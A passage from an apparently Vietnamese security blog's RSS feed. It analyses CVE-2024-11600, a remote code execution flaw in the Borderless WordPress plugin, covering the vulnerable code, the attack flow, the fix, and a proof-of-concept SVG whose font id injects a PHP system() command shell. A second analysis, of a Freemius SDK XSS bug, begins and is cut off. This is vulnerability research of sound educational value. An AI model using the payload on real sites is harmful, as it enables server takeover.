$font_attr[&amp;#39;id&amp;#39;];&#xA;$this-&amp;gt;ip_name = sanitize_text_field( $this-&amp;gt;ip_name );&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Lấy thuộc tính &lt;code&gt;id&lt;/code&gt; của &lt;code&gt;&amp;lt;font&amp;gt;&lt;/code&gt; làm tên font (&lt;code&gt;ip_name&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;li&gt;Chỉ lọc bằng &lt;code&gt;sanitize_text_field&lt;/code&gt; → đây chính là điểm yếu, vì hàm này không loại bỏ ký tự nguy hiểm trong ngữ cảnh file PHP.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Kiểm tra trùng tên&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$font_folder = trailingslashit( $this-&amp;gt;paths[&amp;#39;fontdir&amp;#39;] ) . $this-&amp;gt;ip_name;&#xA;if ( is_dir( $font_folder ) ) {&#xA;    $this-&amp;gt;delete_folder( $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] );&#xA;    die( esc_html__( &amp;#34;There is already an Icon Pack with this name...&amp;#34;, &amp;#34;borderless&amp;#34; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Nếu thư mục font với tên đó đã tồn tại, quá trình bị hủy.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;5&#34;&gt;&#xA;&lt;li&gt;Parse JSON để lấy danh sách icon&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$file_contents = json_decode( $json );&#xA;if ( ! isset( $file_contents-&amp;gt;IcoMoonType ) ) {&#xA;    $this-&amp;gt;delete_folder( $this-&amp;gt;paths[&amp;#39;tempdir&amp;#39;] );&#xA;    die( esc_html__( &amp;#34;This Icon Pack is not an Icomoon pack...&amp;#34;, &amp;#39;borderless&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Đảm bảo JSON là pack IcoMoon hợp lệ.&lt;/li&gt;&#xA;&lt;li&gt;Lặp qua danh sách icon, sanitize tên, class, tags rồi đưa vào &lt;code&gt;$this-&amp;gt;json_config&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;6&#34;&gt;&#xA;&lt;li&gt;Sinh cấu hình và ghi file&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! empty( $this-&amp;gt;json_config ) &amp;amp;&amp;amp; $this-&amp;gt;ip_name != &amp;#39;unknown&amp;#39; ) {&#xA;    $this-&amp;gt;write_config();&#xA;    $this-&amp;gt;re_write_css();&#xA;    $this-&amp;gt;rename_files();&#xA;    $this-&amp;gt;rename_folder();&#xA;    $this-&amp;gt;add_font();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Nếu dữ liệu hợp lệ, plugin sẽ:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Ghi file &lt;code&gt;charmap.php&lt;/code&gt; chứa mảng &lt;code&gt;$icons&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Sinh lại CSS.&lt;/li&gt;&#xA;&lt;li&gt;Đổi tên file và thư mục.&lt;/li&gt;&#xA;&lt;li&gt;Thêm font pack vào hệ thống.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;File JSON và SVG yêu cầu sẽ có dạng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;IcoMoonType&amp;#34;: &amp;#34;selection&amp;#34;,&#xA;  &amp;#34;icons&amp;#34;: [&#xA;    {&#xA;      &amp;#34;properties&amp;#34;: {&#xA;        &amp;#34;name&amp;#34;: &amp;#34;home&amp;#34;&#xA;      },&#xA;      &amp;#34;icon&amp;#34;: {&#xA;        &amp;#34;tags&amp;#34;: [&amp;#34;house&amp;#34;, &amp;#34;main&amp;#34;]&#xA;      }&#xA;    }&#xA;  ]&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; standalone=&amp;#34;no&amp;#34;?&amp;gt;&#xA;&amp;lt;!DOCTYPE svg PUBLIC &amp;#34;-//W3C//DTD SVG 1.1//EN&amp;#34;&#xA;  &amp;#34;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&amp;#34;&amp;gt;&#xA;&amp;lt;svg xmlns=&amp;#34;http://www.w3.org/2000/svg&amp;#34;&amp;gt;&#xA;  &amp;lt;defs&amp;gt;&#xA;    &amp;lt;font id=&amp;#34;id&amp;#34; horiz-adv-x=&amp;#34;1024&amp;#34;&amp;gt;&#xA;      &amp;lt;font-face font-family=&amp;#34;icomoon&amp;#34; units-per-em=&amp;#34;1024&amp;#34; ascent=&amp;#34;960&amp;#34; descent=&amp;#34;-64&amp;#34;/&amp;gt;&#xA;      &amp;lt;glyph unicode=&amp;#34;&amp;amp;#xe900;&amp;#34; glyph-name=&amp;#34;home&amp;#34; d=&amp;#34;M512 128L128 512h128v320h192V640h128v192h192V512h128z&amp;#34;/&amp;gt;&#xA;    &amp;lt;/font&amp;gt;&#xA;  &amp;lt;/defs&amp;gt;&#xA;&amp;lt;/svg&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Attacker with Administrator privilege&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Uploads a ZIP file containing an Icon Pack (SVG &amp;#43; JSON)&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;AJAX call: borderless_ajax_add_zipped_font&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;zip_flatten() extracts files into /uploads/borderless_icon_fonts/borderless_temp/&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;create_config() is executed&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;Reads the SVG file&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;Extracts font id=... as ip_name&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;sanitize_text_field(ip_name) (dangerous characters not removed)&amp;#34;]&#xA;&#xA;E --&amp;gt; I[&amp;#34;Reads JSON file&amp;#34;]&#xA;I --&amp;gt; J[&amp;#34;Builds $this-&amp;gt;json_config array&amp;#34;]&#xA;&#xA;H &amp;amp; J --&amp;gt; K[&amp;#34;write_config() writes data into charmap.php&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;Injected payload is embedded into PHP code&amp;#34;]&#xA;L --&amp;gt; M[&amp;#34;charmap.php now contains malicious PHP&amp;#34;]&#xA;&#xA;M --&amp;gt; N[&amp;#34;Server loads/includes charmap.php&amp;#34;]&#xA;N --&amp;gt; O[&amp;#34;Remote Code Execution (RCE)&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Tạo ZIP file chứa &lt;code&gt;rce.json&lt;/code&gt; và &lt;code&gt;rce.svg&lt;/code&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;IcoMoonType&amp;#34;: &amp;#34;selection&amp;#34;,&#xA;  &amp;#34;icons&amp;#34;: [&#xA;    {&#xA;      &amp;#34;properties&amp;#34;: {&#xA;        &amp;#34;name&amp;#34;: &amp;#34;home&amp;#34;&#xA;      },&#xA;      &amp;#34;icon&amp;#34;: {&#xA;        &amp;#34;tags&amp;#34;: [&amp;#34;house&amp;#34;, &amp;#34;main&amp;#34;]&#xA;      }&#xA;    }&#xA;  ]&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; standalone=&amp;#34;no&amp;#34;?&amp;gt;&#xA;&amp;lt;!DOCTYPE svg PUBLIC &amp;#34;-//W3C//DTD SVG 1.1//EN&amp;#34;&#xA;  &amp;#34;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&amp;#34;&amp;gt;&#xA;&amp;lt;svg xmlns=&amp;#34;http://www.w3.org/2000/svg&amp;#34;&amp;gt;&#xA;  &amp;lt;defs&amp;gt;&#xA;    &amp;lt;font id=&amp;#34;&amp;#39;];system($_REQUEST[&amp;#39;cmd&amp;#39;]);//&amp;#34; horiz-adv-x=&amp;#34;1024&amp;#34;&amp;gt;&#xA;      &amp;lt;font-face font-family=&amp;#34;icomoon&amp;#34; units-per-em=&amp;#34;1024&amp;#34; ascent=&amp;#34;960&amp;#34; descent=&amp;#34;-64&amp;#34;/&amp;gt;&#xA;      &amp;lt;glyph unicode=&amp;#34;&amp;amp;#xe900;&amp;#34; glyph-name=&amp;#34;home&amp;#34; d=&amp;#34;M512 128L128 512h128v320h192V640h128v192h192V512h128z&amp;#34;/&amp;gt;&#xA;    &amp;lt;/font&amp;gt;&#xA;  &amp;lt;/defs&amp;gt;&#xA;&amp;lt;/svg&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Dùng Administrator account upload ZIP file lên tại endpoint:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;http://localhost/wp-admin/admin.php?page=borderless-fonts&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-06-cve-2024-11600/upload.png&#34; title=&#34;File được upload&#34; data-thumbnail=&#34;/posts/2025-12-06-cve-2024-11600/upload.png&#34; data-sub-html=&#34;&lt;h2&gt;Uploaded&lt;/h2&gt;&lt;p&gt;File được upload&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-06-cve-2024-11600/upload.png&#39; alt=&#34;Uploaded&#34; height=&#34;152&#34; width=&#34;1099&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;File được upload&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;RCE&lt;/strong&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-06-cve-2024-11600/result.png&#34; title=&#34;Kết quả&#34; data-thumbnail=&#34;/posts/2025-12-06-cve-2024-11600/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Kết quả&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-06-cve-2024-11600/result.png&#39; alt=&#34;Result&#34; height=&#34;757&#34; width=&#34;1491&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Kết quả&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2024-11600 cho thấy việc dùng sai hàm lọc dữ liệu có thể dẫn tới &lt;strong&gt;Remote Code Execution&lt;/strong&gt;. Plugin Borderless (≤ 1.6.0) lấy trực tiếp giá trị &lt;code&gt;&amp;lt;font id&amp;gt;&lt;/code&gt; từ SVG, chỉ lọc bằng &lt;code&gt;sanitize_text_field()&lt;/code&gt;, rồi ghi vào file PHP (&lt;code&gt;charmap.php&lt;/code&gt;). Kẻ tấn công có quyền Admin có thể chèn mã PHP vào đó và được thực thi khi file được load. Bản 1.6.1 đã khắc phục bằng cách dùng &lt;code&gt;sanitize_file_name()&lt;/code&gt; và giá trị fallback.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Luôn &lt;strong&gt;lọc theo đúng ngữ cảnh&lt;/strong&gt; (đang ghi vào PHP, không phải text thường).&lt;/li&gt;&#xA;&lt;li&gt;Không dùng &lt;code&gt;sanitize_text_field()&lt;/code&gt; cho dữ liệu ghi vào mã nguồn thực thi.&lt;/li&gt;&#xA;&lt;li&gt;SVG/ZIP cũng có thể là vector tấn công.&lt;/li&gt;&#xA;&lt;li&gt;Việc tự động tạo file &lt;code&gt;.php&lt;/code&gt; luôn cần kiểm soát chặt chẽ.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://vdp.patchstack.com/database/wordpress/plugin/borderless/vulnerability/wordpress-borderless-plugin-1-5-9-authenticated-administrator-remote-code-execution-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Borderless Plugin &amp;lt;= 1.6.0 is vulnerable to Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2023-33999 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-05-cve-2023-33999/</link>
      <pubDate>Fri, 05 Dec 2025 20:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-05-cve-2023-33999/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-05-cve-2023-33999/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Freemius SDK cho WordPress&lt;/strong&gt; không xử lý &lt;strong&gt;làm sạch (sanitize)&lt;/strong&gt; dữ liệu đầu vào hoặc &lt;strong&gt;thoát (escape)&lt;/strong&gt; dữ liệu đầu ra một cách đầy đủ, dẫn đến lỗ hổng &lt;strong&gt;Reflected Cross-Site Scripting (XSS)&lt;/strong&gt;. Điều này trực tiếp ảnh hưởng đến &lt;strong&gt;hơn 1.000 plugin và giao diện (theme)&lt;/strong&gt; đang sử dụng SDK này.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://wpscan.com/vulnerability/35d2f1e7-a4f8-49fd-a8dd-bb2c26710f93/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2023-33999&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Cross Site Scripting&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.5.9&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.5.10&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (6.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://freemius.com/help/documentation/wordpress-sdk/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Freemius SDK for WordPress&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;TablePress&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.1.4&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.1.5&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;about-freemius-sdk&#34;&gt;&lt;span&gt;About Freemius SDK&lt;/span&gt;&#xA;  &lt;a href=&#34;#about-freemius-sdk&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Freemius SDK&lt;/strong&gt; là một bộ thư viện (Software Development Kit) dành cho &lt;strong&gt;WordPress&lt;/strong&gt;, giúp nhà phát triển plugin và theme dễ dàng thêm các chức năng sau vào sản phẩm của họ:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Quản lý &lt;strong&gt;bản quyền (licensing)&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Xử lý &lt;strong&gt;phiên bản miễn phí / trả phí (freemium / premium)&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Cho phép người dùng &lt;strong&gt;kết nối tài khoản (opt-in)&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Thu thập &lt;strong&gt;thống kê sử dụng (analytics)&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Quản lý &lt;strong&gt;thanh toán và gia hạn&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Hiển thị 